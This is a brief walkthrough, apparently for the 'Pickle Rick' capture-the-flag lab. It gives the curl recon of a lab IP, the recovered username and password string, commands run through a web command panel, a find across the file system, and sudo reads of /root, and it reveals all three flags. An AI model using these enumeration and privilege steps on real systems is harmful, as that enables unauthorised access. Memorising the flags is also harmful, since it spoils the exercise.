# Pickle Rick CTF Walkthrough

# Step 1: Recon
curl http://10.81.174.238/robots.txt
# Output: Wubbalubbadubdub

# Found login credentials
# Username: R1ckRul3s

# Step 2: Explore assets
curl http://10.81.174.238/assets/
# bootstrap.min.css, bootstrap.min.js, jquery.min.js, fail.gif, picklerick.gif, portal.jpg, rickandmorty.jpeg

# Step 3: Command Panel
# Navigated to portal, found input window + execute button

# Step 4: Enumeration
ls
# Sup3rS3cretPickl3Ingred.txt  assets  clue.txt  denied.php  index.html  login.php  portal.php  robots.txt

strings Sup3rS3cretPickl3Ingred.txt
# mr. meeseek hair

strings clue.txt
# "Look around the file system for the other ingredient."

# Step 5: Ingredient Hunt
find / -name "*ingred*" 2>/dev/null
# /home/rick/second ingredients

strings "/home/rick/second ingredients"
# jerry tear

sudo ls -la /root
sudo strings /root/3rd.txt
# fleeb juice

# Final Flag
echo "Ingredients collected:"
echo "1. Mr. Meeseek Hair"
echo "2. Jerry Tear"
echo "3. Fleeb Juice"

# Rick is saved!